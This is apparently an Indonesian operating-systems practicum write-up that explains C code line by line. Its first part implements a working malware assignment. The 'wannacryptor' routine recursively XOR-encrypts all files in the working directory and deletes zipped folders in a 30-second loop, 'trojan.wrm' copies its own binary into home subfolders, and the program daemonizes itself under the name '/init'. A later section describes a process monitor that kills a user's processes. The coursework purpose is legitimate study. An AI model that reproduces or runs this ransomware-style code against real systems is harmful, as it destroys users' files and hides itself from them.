    DIR *dir = opendir(dirpath);
    if (!dir) return;

    struct dirent *entry;
    char fullpath[1024];

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        snprintf(fullpath, sizeof(fullpath), "%s/%s", dirpath, entry->d_name);

        struct stat st;
        if (stat(fullpath, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            encrypt_all_files(fullpath, self_exe);
        } else if (S_ISREG(st.st_mode)) {
            if (strcmp(fullpath, self_exe) != 0) {
                printf("Enkripsi: %s\n", fullpath);
                simple_xor_encrypt(fullpath);
            }
        }
    }

    closedir(dir);
}
```
- `void encrypt_all_files(const char *dirpath, const char *self_exe) { ... }`: Fungsi untuk melakukan enkripsi seluruh file reguler dalam sebuah direktori (termasuk subdirektorinya), kecuali file executable dirinya sendiri.
- `DIR *dir = opendir(dirpath); if (!dir) return;`: Membuka direktori dirpath, jika gagal langsung keluar.
- `struct dirent *entry; char fullpath[1024];`: Menyimpan entri direktori dan path lengkap dari file yang akan diproses.
- `while ((entry = readdir(dir)) != NULL) { if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;`: Loop setiap isi direktori,serta abaikan `.` dan `..`.
- `snprintf(fullpath, sizeof(fullpath), "%s/%s", dirpath, entry->d_name);`: Gabungkan path direktori dan nama file jadi path lengkap.
- `struct stat st; if (stat(fullpath, &st) == -1) continue;`: Dapatkan informasi file, skip jika gagal.
- `if (S_ISDIR(st.st_mode)) { encrypt_all_files(fullpath, self_exe); }`: Jika file adalah direktori, rekursif panggil `encrypt_all_files`.
- `else if (S_ISREG(st.st_mode)) { if (strcmp(fullpath, self_exe) != 0) { printf("Enkripsi: %s\n", fullpath); simple_xor_encrypt(fullpath); } }`: Jika file reguler dan bukan file dirinya sendiri (`self_exe`), cetak info dan enkripsi file dengan fungsi `simple_xor_encrypt`.
- `closedir(dir);`: Tutup direktori setelah selesai.

```bash
void delete_directory(const char *path) {
    DIR *dir = opendir(path);
    if (!dir) return;

    struct dirent *entry;
    char fullpath[1024];

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);

        struct stat st;
        if (stat(fullpath, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            delete_directory(fullpath);
        } else {
            unlink(fullpath);
        }
    }

    closedir(dir);
    rmdir(path);
}
```
- `void delete_directory(const char *path) {`: Fungsi untuk menghapus seluruh isi folder (termasuk subfolder) dan folder itu sendiri.
- `DIR *dir = opendir(path); if (!dir) return;`: Buka direktori path, jika gagal (misal tidak ada), keluar dari fungsi.
- `struct dirent *entry; char fullpath[1024];`: entry untuk membaca isi direktori. fullpath untuk menyimpan path lengkap dari file/subfolder.
- `while ((entry = readdir(dir)) != NULL) { if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;`: Loop tiap entri, abaikan entri `.` dan `..`.
- `snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);`: Buat path lengkap dari file/folder saat ini.
- `struct stat st; if (stat(fullpath, &st) == -1) continue;`: Ambil informasi file/folder tersebut, skip jika gagal.
- `if (S_ISDIR(st.st_mode)) { delete_directory(fullpath); } else { unlink(fullpath); }`: Jika fullpath adalah folder → panggil `delete_directory` secara rekursif, sedangkan jika file biasa → hapus dengan `unlink`.
- `closedir(dir); rmdir(path);`: Setelah semua isi direktori dihapus, tutup dan hapus direktori itu sendiri.

```bash
void simple_xor_encrypt(const char *filename) {
    FILE *f = fopen(filename, "rb+");
    if (!f) {
        perror("Gagal buka file untuk enkripsi");
        return;
    }

    time_t timestamp = time(NULL);
    unsigned char key[8];
    for (int i = 0; i < 8; i++) {
        key[i] = (timestamp >> (i * 8)) & 0xFF;
    }

    int c;
    size_t i = 0;
    while ((c = fgetc(f)) != EOF) {
        fseek(f, -1, SEEK_CUR);
        fputc(c ^ key[i % 8], f);
        i++;
    }

    fclose(f);
}
```
- `void simple_xor_encrypt(const char *filename) {`: Fungsi untuk melakukan enkripsi XOR sederhana terhadap isi file yang diberikan.
- `FILE *f = fopen(filename, "rb+"); if (!f) { perror("Gagal buka file untuk enkripsi"); return; }`: Buka file dalam mode baca-tulis biner (rb+), supaya bisa baca dan langsung menulis kembali hasil enkripsinya ke tempat yang sama, sedangkan jika gagal, tampilkan error dan keluar dari fungsi.
- `time_t timestamp = time(NULL);`: Ambil timestamp saat ini untuk menjadi dasar dalam membuat key enkripsi.
- `unsigned char key[8]; for (int i = 0; i < 8; i++) { key[i] = (timestamp >> (i * 8)) & 0xFF; }`: Buat key XOR 8-byte dari timestamp, dipecah byte per byte (little endian style).
- `int c; size_t i = 0; while ((c = fgetc(f)) != EOF) { fseek(f, -1, SEEK_CUR); fputc(c ^ key[i % 8], f); i++; }`: Loop baca byte demi byte. Setelah membaca byte, `fseek` mundur 1 langkah ke belakang (karena kita ingin menulis di tempat yang sama). Lalu byte tersebut diXOR dengan key, lalu tulis hasilnya. `i % 8` disini untuk memutar penggunaan 8-byte key secara siklik.
- `fclose(f);`: tutup file setelah enkripsi setelah selesai.

```bash
void zip_and_encrypt() {
    DIR *dir = opendir(".");
    if (!dir) {
        perror("Gagal buka direktori");
        return;
    }

    struct dirent *entry;
    char exe_path[1024];
    readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    exe_path[sizeof(exe_path) - 1] = '\0';

    pid_t zip_pids[1024];
    char folders_to_delete[1024][256];
    int pid_index = 0;
    int folder_index = 0;

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        struct stat st;
        if (stat(entry->d_name, &st) == -1)
            continue;

        if (S_ISDIR(st.st_mode)) {
            char zipname[1024];
            snprintf(zipname, sizeof(zipname), "%s.zip", entry->d_name);

            pid_t pid = fork();
            if (pid == 0) {
                char *argv[] = {"zip", "-r", zipname, entry->d_name, NULL};
                execvp("zip", argv);
                perror("execvp zip gagal");
                exit(1);
            } else if (pid > 0) {
                zip_pids[pid_index++] = pid;
                strncpy(folders_to_delete[folder_index++], entry->d_name, sizeof(folders_to_delete[0]));
            }
        }
    }
    closedir(dir);

    for (int i = 0; i < pid_index; i++) {
        int status;
        waitpid(zip_pids[i], &status, 0);
        if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
            fprintf(stderr, "Zip gagal untuk folder indeks %d\n", i);
        }
    }

    encrypt_all_files(".", exe_path);
    printf("Enkripsi selesai.\n");

    for (int i = 0; i < folder_index; i++) {
        delete_directory(folders_to_delete[i]);
        printf("Folder %s dihapus.\n", folders_to_delete[i]);
    }
}
```
- `DIR *dir = opendir(".");`: Buka direktori saat ini (.) untuk membaca semua file dan folder di dalamnya.
- `if (!dir) { perror("Gagal buka direktori"); return; }`: Jika gagal membuka direktori, tampilkan pesan error ke stderr dan hentikan fungsi.
- `readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1); exe_path[sizeof(exe_path) - 1] = '\0';`: Ambil path lengkap dari executable saat ini, lalu akhiri string dengan null terminator agar valid sebagai string.
- `pid_t zip_pids[1024]; char folders_to_delete[1024][256]; int pid_index = 0; int folder_index = 0;`: Array untuk menyimpan PID dari proses zip, nama folder yang nanti akan dihapus, dan indeksnya masing-masing.
- `while ((entry = readdir(dir)) != NULL) {...}`: Loop untuk membaca isi direktori satu per satu.
- `if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;`: Lewati entri `.` dan `..` karena itu hanya pointer ke direktori saat ini dan induk.
- `if (stat(entry->d_name, &st) == -1) continue;`: Ambil informasi file. Jika gagal, lanjut ke entri berikutnya.
- `if (S_ISDIR(st.st_mode)) { ... }`: Jika entri adalah folder, maka:
    - `snprintf(zipname, sizeof(zipname), "%s.zip", entry->d_name);`: Buat nama zip berdasarkan nama folder.
    - `pid_t pid = fork();`: Buat proses anak baru untuk melakukan zip.
    - `if (pid == 0) { char *argv[] = {"zip", "-r", zipname, entry->d_name, NULL}; execvp("zip", argv); ... }`: Di proses anak, jalankan perintah zip -r nama.zip folder menggunakan execvp.
    - `else if (pid > 0) { zip_pids[pid_index++] = pid; strncpy(folders_to_delete[folder_index++], entry->d_name, sizeof(folders_to_delete[0])); }`: Di proses induk, simpan PID proses zip dan nama folder untuk dihapus nanti.
- `closedir(dir);`: Tutup direktori setelah semua entri selesai diproses.
- `for (int i = 0; i < pid_index; i++) { ... }`: Tunggu semua proses zip selesai.
    - `waitpid(zip_pids[i], &status, 0);`: Tunggu proses dengan PID terkait.
    - `if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {...}`: Jika proses exit dengan status gagal, tampilkan pesan error.
- `encrypt_all_files(".", exe_path);`: Enkripsi semua file reguler dalam direktori dan subdirektori, kecuali executable itu sendiri.
- `printf("Enkripsi selesai.\n");`: Tampilkan bahwa enkripsi telah selesai.
- `for (int i = 0; i < folder_index; i++) { delete_directory(folders_to_delete[i]); printf("Folder %s dihapus.\n", folders_to_delete[i]); }`: Hapus folder-folder yang sudah dizip dan dienkripsi.

```bash
void wannacryptor() {
    FILE *log = fopen("/tmp/wannalog.txt", "a+");
    if (!log) exit(1);

    while (1) {
        zip_and_encrypt();

        fprintf(log, "[wannacryptor] Enkripsi dijalankan.\n");
        fflush(log);

        sleep(30);
    }
}
```
- `FILE *log = fopen("/tmp/wannalog.txt", "a+");`: Buka file log di /tmp dalam mode append agar bisa mencatat aktivitas.
- `if (!log) exit(1);`: Jika gagal membuka log, keluar dari program.
- `while (1) { ... }`: Infinite loop.
    - `zip_and_encrypt();`: Jalankan proses zip dan enkripsi.
    - `fprintf(log, "[wannacryptor] Enkripsi dijalankan.\n"); fflush(log);`: Catat ke dalam log bahwa proses enkripsi telah dilakukan.
    - `sleep(30);`: Tunggu selama 30 detik sebelum mengulang proses.

![WhatsApp Image 2025-04-17 at 22 15 57_3a03caeb](https://github.com/user-attachments/assets/6b7eccae-82f2-4263-b683-d36f53769206)    
 
C. Anak fitur kedua yang bernama trojan.wrm berfungsi untuk menyebarkan malware ini kedalam mesin korban dengan cara membuat salinan binary malware di setiap directory yang ada di home user.

```bash
void run_trojan() {
    const char *source = "/proc/self/exe";
    const char *runme_name = "runme";
    const char *target_base = "/home/rozak";

    DIR *dir = opendir(target_base);
    if (!dir) {
        perror("Gagal buka direktori target");
        exit(1);
    }

    struct dirent *entry;
    char dest_path[1024];

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        char folder_path[1024];
        snprintf(folder_path, sizeof(folder_path), "%s/%s", target_base, entry->d_name);

        struct stat st;
        if (stat(folder_path, &st) == -1 || !S_ISDIR(st.st_mode))
            continue;

        snprintf(dest_path, sizeof(dest_path), "%s/%s", folder_path, runme_name);

        FILE *src = fopen(source, "rb");
        FILE *dst = fopen(dest_path, "wb");

        if (!src || !dst) {
            perror("Gagal copy file runme");
            if (src) fclose(src);
            if (dst) fclose(dst);
            continue;
        }

        int ch;
        while ((ch = fgetc(src)) != EOF)
            fputc(ch, dst);

        fclose(src);
        fclose(dst);

        chmod(dest_path, 600);

        printf("Berhasil copy ke %s\n", dest_path);
    }

    closedir(dir);

    while (1) {
        sleep(5);
    }
}
```
- `const char *source = "/proc/self/exe";`: Menunjuk ke executable program itu sendiri menggunakan link spesial Linux /proc/self/exe.
- `const char *runme_name = "runme";`: Nama file target yang akan disalin ke folder-folder tujuan, diberi nama runme.
- `const char *target_base = "/home/rozak";`: Direktori utama target propagasi, tempat di mana trojan akan menyebarkan salinannya ke semua subfolder.
- `DIR *dir = opendir(target_base);`: Membuka direktori /home/rozak untuk membaca isinya.
- `if (!dir) { perror("Gagal buka direktori target"); exit(1); }`: Jika gagal membuka direktori target, tampilkan pesan kesalahan dan keluar dari program.
- `while ((entry = readdir(dir)) != NULL) { ... }`: Iterasi seluruh isi dari direktori `/home/rozak`.
- `if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;`: Lewati entri khusus `.` dan `...`
- `snprintf(folder_path, sizeof(folder_path), "%s/%s", target_base, entry->d_name);`: Bangun path lengkap ke subfolder seperti /home/rozak/user1, /home/rozak/user2, dll.
- `if (stat(folder_path, &st) == -1 || !S_ISDIR(st.st_mode)) continue;`: Cek apakah path tersebut benar-benar folder. Kalau bukan folder atau gagal diakses, lewati.
- `snprintf(dest_path, sizeof(dest_path), "%s/%s", folder_path, runme_name);`: Tentukan path file tujuan, misalnya /home/rozak/user1/runme.
- `FILE *src = fopen(source, "rb"); FILE *dst = fopen(dest_path, "wb");`: Buka file sumber (executable program sendiri) untuk dibaca dalam mode biner, dan buka file tujuan untuk ditulis dalam mode biner.
- `if (!src || !dst) { perror("Gagal copy file runme"); ... continue; }`: Jika salah satu file gagal dibuka, cetak error, tutup yang sempat dibuka, dan lanjut ke folder berikutnya.
- `int ch; while ((ch = fgetc(src)) != EOF) fputc(ch, dst);`: Salin isi file byte per byte dari src ke dst.
- `fclose(src); fclose(dst);`: Tutup kedua file setelah penyalinan selesai.
- `chmod(dest_path, 600);`: Ubah permission file hasil salinan menjadi hanya bisa dibaca dan ditulis oleh user (read-write, no execute).
- `printf("Berhasil copy ke %s\n", dest_path);`: Tampilkan pesan sukses copy ke folder target.
- `closedir(dir);`: Tutup direktori setelah semua folder selesai diproses.
- `while (1) { sleep(5); }`: Loop selamanya dengan delay 5 detik untuk mempertahankan proses tetap berjalan agar tidak langsung keluar.

![WhatsApp Image 2025-04-17 at 22 18 17_07b1b005](https://github.com/user-attachments/assets/9b5d394e-3a19-4fd2-afc1-b66a2cd45b51)


D. Anak fitur pertama dan kedua terus berjalan secara berulang ulang selama malware masih hidup dengan interval 30 detik.

```bash
int main(int argc, char *argv[]) {
    ...
    if (argc > 0 && strcmp(argv[0], "init") == 0) {
        daemonize();
        chdir(cwd);
        prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0);

        while (1) {
            pid_t pid = fork();
            if (pid == 0) {
                char *args[] = {"wannacryptor", NULL};
                execv("/proc/self/exe", args);
                perror("execv wannacryptor gagal");
                exit(1);
            }
        
            pid_t pid2 = fork();
            if (pid2 == 0) {
                char *args[] = {"trojan.wrm", NULL};
                execv("/proc/self/exe", args);
                perror("execv trojan.wrm gagal");
                exit(1);
            }

            pid_t pid3 = fork();
            if (pid3 == 0) {
                char *args[] = {"rodok.exe", NULL};
                execv("/proc/self/exe", args);
                perror("execv rodok.exe gagal");
                exit(1);
            }
            
            int status;
            waitpid(-1, &status, WNOHANG);

            sleep(30);
        }
    ....
}
```
- `sleep(30);`: menjalankan fitur pertama dan fitur kedua setiap 30 detik.

E. Anak fitur ketiga ini sangat unik. Dinamakan rodok.exe, proses ini akan membuat sebuah fork bomb di dalam perangkat korban.
F. Konon katanya malware ini dibuat oleh Andriana karena dia sedang memerlukan THR. Karenanya, Andriana menambahkan fitur pada fork bomb tadi dimana setiap fork dinamakan mine-crafter-XX (XX adalah nomor dari fork, misal fork pertama akan menjadi mine-crafter-0) dan tiap fork akan melakukan cryptomining. Cryptomining disini adalah membuat sebuah hash hexadecimal (base 16) random sepanjang 64 char. Masing masing hash dibuat secara random dalam rentang waktu 3 detik - 30 detik. Sesuaikan jumlah maksimal mine-crafter dengan spesifikasi perangkat, minimal 3 (Jangan dipaksakan sampai lag, secukupnya saja untuk demonstrasi)
G. Lalu mine-crafter-XX dan mengumpulkan hash yang sudah dibuat dan menyimpannya di dalam file /tmp/.miner.log dengan format: `[YYYY-MM-DD hh:mm:ss][Miner XX] hash` Dimana XX adalah ID mine-crafter yang membuat hash tersebut.
H. Karena mine-crafter-XX adalah anak dari rodok.exe, saat rodok.exe dimatikan, maka seluruh mine-crafter-XX juga akan mati.

```bash
void rodok_launcher() {
    srand(time(NULL));
    setpgid(0, 0);

    signal(SIGTERM, sigterm_handler_rodok);

    for (int miner_id = 0; miner_id < 3; miner_id++) {
        pid_t pid = fork();
        if (pid == 0) {
            char name[32];
            snprintf(name, sizeof(name), "mine-crafter-%02d", miner_id);

            setpgid(0, 0);

            char *args[] = {name, " ", NULL};
            execv("/proc/self/exe", args);
            perror("execv miner gagal");
            exit(1);
        } else if (pid > 0) {
            children[miner_id] = pid;
        }
    }

    int status;
    while (wait(&status) > 0);
}
```
- `srand(time(NULL));`: Inisialisasi random seed (meski belum digunakan di sini).
- `setpgid(0, 0);`: Buat process group baru.
- `signal(SIGTERM, sigterm_handler_rodok);`: Tangani sinyal SIGTERM agar bisa kill semua anak saat dimatikan.
- `for (int miner_id = 0; miner_id < 3; miner_id++)`: Loop untuk buat 3 child process.
- `fork()`: Buat proses baru.
- `if (pid == 0)`: Jika proses anak, lakukan
    - `snprintf(name, ...)`: Format nama proses jadi mine-crafter-XX.
    - `execv("/proc/self/exe", args);`: Jalankan ulang diri sendiri dengan nama proses baru.
- `else if (pid > 0)`: Di proses induk, simpan PID anak ke array.
- `while (wait(&status) > 0);`: Tunggu semua proses anak selesai.

![WhatsApp Image 2025-04-17 at 22 20 10_403735b8](https://github.com/user-attachments/assets/23ca127e-b1a3-4046-b4d8-56fa423f1cfb)

![WhatsApp Image 2025-04-17 at 22 27 31_413864fb](https://github.com/user-attachments/assets/8a6e5b8d-7ee6-4fbf-a74f-2b97795e574f)

```bash
void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);

    umask(0);
    setsid();

    pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);

    chdir("/");

    for (int i = sysconf(_SC_OPEN_MAX); i >= 0; i--) close(i);
    open("/dev/null", O_RDONLY);
    open("/dev/null", O_WRONLY);
    open("/dev/null", O_RDWR);
}
```
- `pid_t pid = fork();`: Buat proses baru. Jika parent, keluar.
- `umask(0);`: Reset file permission mask.
- `setsid();`: Buat sesi baru, jadi leader tanpa terminal.
- `fork()`: Lepaskan diri dari sesi agar tidak jadi session leader.
- `chdir("/");`: Pindah ke root directory.
- `close(i)`: Tutup semua file descriptor terbuka.
- `open("/dev/null", ...)`: Arahkan stdin, stdout, stderr ke /dev/null.

```bash
int main(int argc, char *argv[]) {
    char cwd[1024];
    getcwd(cwd, sizeof(cwd));

    if (argc > 0 && strcmp(argv[0], "rodok.exe") == 0) {
        prctl(PR_SET_NAME, (unsigned long)"rodok.exe", 0, 0, 0);
            rodok_launcher();
        return 0;
    }

    if (argc > 0 && strcmp(argv[0], "wannacryptor") == 0) {
        prctl(PR_SET_NAME, (unsigned long)"wannacryptor", 0, 0, 0);
            wannacryptor();
        return 0;
    }
    
    if (argc > 0 && strcmp(argv[0], "trojan.wrm") == 0) {
        prctl(PR_SET_NAME, (unsigned long)"trojan.wrm", 0, 0, 0);
            run_trojan();
        return 0;
    }
    
    if (argc > 0 && strcmp(argv[0], "init") == 0) {
        daemonize();
        chdir(cwd);
        prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0);

        while (1) {
            pid_t pid = fork();
            if (pid == 0) {
                char *args[] = {"wannacryptor", NULL};
                execv("/proc/self/exe", args);
                perror("execv wannacryptor gagal");
                exit(1);
            }
        
            pid_t pid2 = fork();
            if (pid2 == 0) {
                char *args[] = {"trojan.wrm", NULL};
                execv("/proc/self/exe", args);
                perror("execv trojan.wrm gagal");
                exit(1);
            }

            pid_t pid3 = fork();
            if (pid3 == 0) {
                char *args[] = {"rodok.exe", NULL};
                execv("/proc/self/exe", args);
                perror("execv rodok.exe gagal");
                exit(1);
            }
            
            int status;
            waitpid(-1, &status, WNOHANG);

            sleep(30);
        }
    }

    char *newargv[] = { "init", NULL};
    execv("/proc/self/exe", newargv);
    perror("execv init gagal");
    exit(1);
}
```
- `getcwd(cwd, sizeof(cwd));`: Mendapatkan direktori kerja saat ini dan menyimpannya dalam variabel cwd. Ini berguna jika perlu mengubah direktori kerja atau kembali ke direktori sebelumnya.
- `if (argc > 0 && strcmp(argv[0], "rodok.exe") == 0) { rodok_launcher(); }`: Jika program dijalankan dengan argumen "rodok.exe", maka menjalankan rodok_launcher().
- `if (argc > 0 && strcmp(argv[0], "wannacryptor") == 0) { wannacryptor(); }`: Jika argumen pertama adalah "wannacryptor", maka menjalankan wannacryptor().
- `if (argc > 0 && strcmp(argv[0], "trojan.wrm") == 0) { run_trojan(); }`: Jika argumen pertama adalah "trojan.wrm", maka menjalankan run_trojan().
- `if (argc > 0 && strcmp(argv[0], "init") == 0) { daemonize(); chdir(cwd); prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0); ... }`: Jika argumen pertama adalah "init", maka:
    - Memulai daemon dengan `daemonize()` untuk membuat proses berjalan di background.
    - Mengembalikan direktori kerja ke yang semula (`chdir(cwd)`).
    - Menetapkan nama proses menjadi "/init".
    - Membuat tiga fork untuk menjalankan `wannacryptor`, `trojan.wrm`, dan `rodok.exe`, masing-masing berjalan sebagai proses terpisah.
    - Proses utama menunggu setiap 30 detik dan menunggu status proses yang selesai dengan `waitpid()`.
- `char *newargv[] = { "init", NULL}; execv("/proc/self/exe", newargv);`: Membuat proses baru dengan menjalankannya dengan argumen "init" yang kemudian akan menjalankan proses `wannacryptor`, `trojan.wrm`, dan `rodok.exe` dalam fork terpisah (Memastikan 3 proses tersebut berjalan secara terpisah).

## Soal 4
[Author: Nayla / naylaarr]

Suatu hari, Nobita menemukan sebuah alat aneh di laci mejanya. Alat ini berbentuk robot kecil dengan mata besar yang selalu berkedip-kedip. Doraemon berkata, "Ini adalah Debugmon! Robot super kepo yang bisa memantau semua aktivitas di komputer!" Namun, alat ini harus digunakan dengan hati-hati. Jika dipakai sembarangan, bisa-bisa komputer Nobita malah error total! 😱

A. Mengetahui semua aktivitas user

Doraemon ingin melihat apa saja yang sedang dijalankan user di komputernya. Maka, dia mengetik:
`./debugmon list <user>`
Debugmon langsung menampilkan daftar semua proses yang sedang berjalan pada user tersebut beserta PID, command, CPU usage, dan memory usage.

```bash
void handle_list(const char *username) {
    struct passwd *pw = get_user_info(username);
    if (!pw) return;

    uid_t uid_target = pw->pw_uid;
    DIR *proc = opendir("/proc");
    if (!proc) return;

    struct dirent *entry;
    printf("%-8s %-20s %-10s %-10s\n", "PID", "COMMAND", "CPU(%)", "MEM(KB)");
    while ((entry = readdir(proc))) {
        if (is_number(entry->d_name)) {
            uid_t uid;
            char name[256];
            if (get_process_info(entry->d_name, &uid, name, sizeof(name)) && uid == uid_target) {
                float cpu;
                long mem;
                if (get_cpu_mem_usage(entry->d_name, &cpu, &mem))
                    printf("%-8s %-20s %-10.2f %-10ld\n", entry->d_name, name, cpu, mem);
            }
        }
    }

    closedir(proc);
}
```
- `struct passwd *pw = get_user_info(username);`: Mengambil informasi user berdasarkan username.
- `if (!pw) return;`: Jika user tidak ditemukan, keluar dari fungsi. 
- `uid_t uid_target = pw->pw_uid;`: Mendapatkan UID dari user yang dicari.
- `DIR *proc = opendir("/proc");`: Membuka direktori `/proc` untuk membaca semua proses yang berjalan.
- `printf("%-8s %-20s %-10s %-10s\n", "PID", "COMMAND", "CPU(%)", "MEM(KB)");`: Mencetak header tabel untuk output.
- `while ((entry = readdir(proc))) { ... }`: Loop untuk membaca setiap entri di dalam direktori `/proc`.
- `if (is_number(entry->d_name)) { ... }`: Memeriksa apakah nama entri adalah angka (PID).
- `uid_t uid; char name[256];`: Mendeklarasikan variabel untuk menyimpan UID dan nama proses.
- `if (get_process_info(entry->d_name, &uid, name, sizeof(name)) && uid == uid_target) { ... }`: Mengambil informasi proses berdasarkan PID dan memeriksa apakah UID-nya sesuai dengan UID target.
- `if (get_cpu_mem_usage(entry->d_name, &cpu, &mem))`: Mengambil penggunaan CPU dan memori dari proses.
- `printf("%-8s %-20s %-10.2f %-10ld\n", entry->d_name, name, cpu, mem);`: Mencetak informasi proses yang ditemukan.

![Image](https://github.com/user-attachments/assets/3dce1336-d89c-468b-bf6a-82244111443d)

B. Memasang mata-mata dalam mode daemon
Doraemon ingin agar Debugmon terus memantau user secara otomatis. Doraemon pun menjalankan program ini secara daemon dan melakukan pencatatan ke dalam file log dengan menjalankan:
`./debugmon daemon <user>`

```bash
    void handle_daemon(const char *username) {
    struct passwd *pw = get_user_info(username);
    if (!pw) return;

    uid_t uid_target = pw->pw_uid;
    char log_path[512], pid_path[512];
    get_paths(pw->pw_dir, username, log_path, pid_path, NULL);

    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS); // Parent

    setsid();
    chdir("/");
    close(STDIN_FILENO); close(STDOUT_FILENO); close(STDERR_FILENO);

    FILE *pid_file = fopen(pid_path, "w");
    if (pid_file) {
        fprintf(pid_file, "%d\n", getpid());
        fclose(pid_file);
    }

    while (1) {
        monitor_user(uid_target, log_path, is_failing_mode(pw->pw_dir));
        sleep(1);
    }
}
```
- `struct passwd *pw = get_user_info(username);`: Mengambil informasi user berdasarkan username.
- `if (!pw) return;`: Jika user tidak ditemukan, keluar dari fungsi.
- `uid_t uid_target = pw->pw_uid;`: Mendapatkan UID dari user yang dicari.
- `get_paths(pw->pw_dir, username, log_path, pid_path, NULL);`: Mengambil path log dan PID berdasarkan direktori home user.
- `pid_t pid = fork();`: Membuat proses baru.
- `if (pid < 0) exit(EXIT_FAILURE);`: Jika fork gagal, keluar dengan status error.
- `if (pid > 0) exit(EXIT_SUCCESS);`: Jika ini adalah proses induk, keluar agar hanya proses anak yang berjalan.
- `setsid();`: Membuat sesi baru agar proses tidak terikat pada terminal.
- `chdir("/");`: Mengubah direktori kerja ke root.
- `close(STDIN_FILENO); close(STDOUT_FILENO); close(STDERR_FILENO);`: Menutup semua file descriptor standar agar tidak terhubung ke terminal.
- `FILE *pid_file = fopen(pid_path, "w");`: Membuka file PID untuk menulis.
- `if (pid_file) { fprintf(pid_file, "%d\n", getpid()); fclose(pid_file); }`: Jika file berhasil dibuka, tulis PID proses ke dalam file dan tutup file.
- `while (1) { monitor_user(uid_target, log_path, is_failing_mode(pw->pw_dir)); sleep(1); }`: Loop tak terhingga untuk memantau aktivitas user setiap detik.

```bash
void monitor_user(uid_t uid_target, const char *log_path, bool fail_mode) {
    DIR *proc = opendir("/proc");
    if (!proc) return;

    struct dirent *entry;
    while ((entry = readdir(proc))) {
        if (is_number(entry->d_name)) {
            uid_t uid;
            char name[256];
            if (get_process_info(entry->d_name, &uid, name, sizeof(name)) && uid == uid_target) {
                int pid = atoi(entry->d_name);
                if (pid < MAX_PID && !seen_pids[pid]) {
                    seen_pids[pid] = true;
                    if (fail_mode) {
                        write_log(log_path, name, "FAILED");
                        kill(pid, SIGKILL);
                    }
                }
            }
        }
    }

    closedir(proc);
}
``` 

- `struct dirent *entry;`: Mendeklarasikan variabel untuk menyimpan entri direktori.
- `while ((entry = readdir(proc))) { ... }`: Loop untuk membaca setiap entri di dalam direktori `/proc`.
- `if (is_number(entry->d_name)) { ... }`: Memeriksa apakah nama entri adalah angka (PID).
- `if (get_process_info(entry->d_name, &uid, name, sizeof(name)) && uid == uid_target) { ... }`: Mengambil informasi proses berdasarkan PID dan memeriksa apakah UID-nya sesuai dengan UID target.
- `int pid = atoi(entry->d_name);`: Mengonversi nama entri menjadi PID.
- `if (pid < MAX_PID && !seen_pids[pid]) { ... }`: Memeriksa apakah PID valid dan belum pernah dilihat sebelumnya.
- `seen_pids[pid] = true;`: Tandai PID sebagai sudah dilihat.
- `if (fail_mode) { write_log(log_path, name, "FAILED"); kill(pid, SIGKILL); }`: Jika dalam mode failing, tulis log dan bunuh proses.

C. Menghentikan pengawasan
User mulai panik karena setiap gerak-geriknya diawasi! Dia pun memohon pada Doraemon untuk menghentikannya dengan:
`./debugmon stop <user>`

```bash
void handle_stop(const char *username) {
    struct passwd *pw = get_user_info(username);
    if (!pw) return;

    char pid_path[512], log_path[512];
    get_paths(pw->pw_dir, username, log_path, pid_path, NULL);

    FILE *pid_file = fopen(pid_path, "r");
    if (!pid_file) {
        fprintf(stderr, "PID file not found. Is daemon running?\n");
        return;
    }

    pid_t pid;
    fscanf(pid_file, "%d", &pid);
    fclose(pid_file);

    if (kill(pid, SIGTERM) == 0) {
        write_log(log_path, "debugmon-stop", "RUNNING");
        remove(pid_path);
        printf("Daemon for %s (PID %d) terminated.\n", username, pid);
    } else {
        perror("Failed to kill daemon");
    }
}
```
- `struct passwd *pw = get_user_info(username);`: Mengambil informasi user berdasarkan username.
- `char pid_path[512], log_path[512];`: Mendeklarasikan variabel untuk menyimpan path PID dan log.
- `get_paths(pw->pw_dir, username, log_path, pid_path, NULL);`: Mengambil path log dan PID berdasarkan direktori home user. 
- `FILE *pid_file = fopen(pid_path, "r");`: Membuka file PID untuk dibaca.
- `if (!pid_file) { fprintf(stderr, "PID file not found. Is daemon running?\n"); return; }`: Jika file tidak ditemukan, tampilkan pesan error dan keluar dari fungsi.
- `pid_t pid; fscanf(pid_file, "%d", &pid); fclose(pid_file);`: Membaca PID dari file dan menutup file.
- `if (kill(pid, SIGTERM) == 0) { ... }`: Mengirim sinyal SIGTERM ke proses daemon.
- `write_log(log_path, "debugmon-stop ", "RUNNING");`: Menulis log bahwa daemon dihentikan.
- `remove(pid_path);`: Menghapus file PID.

D. Menggagalkan semua proses user yang sedang berjalan
Doraemon yang iseng ingin mengerjai user dengan mengetik:
`./debugmon fail <user>
`Debugmon langsung menggagalkan semua proses yang sedang berjalan dan menulis status proses ke dalam file log dengan status FAILED. Selain menggagalkan, user juga tidak bisa menjalankan proses lain dalam mode ini.

```bash
void handle_fail(const char *username) {
    struct passwd *pw = get_user_info(username);
    if (!pw) return;

